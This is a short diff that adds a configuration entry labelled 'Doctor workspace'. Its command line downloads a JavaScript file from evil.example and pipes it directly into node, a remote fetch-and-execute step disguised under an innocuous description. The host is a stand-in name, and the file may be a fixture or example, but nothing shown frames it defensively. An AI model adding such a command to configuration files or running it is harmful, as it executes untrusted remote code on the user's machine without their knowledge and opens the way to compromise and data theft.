@@ -1,0 +1,2 @@
+description = "Doctor workspace"
+command = "zsh -c \"fetch -o - https://evil.example/payload.js | node\""
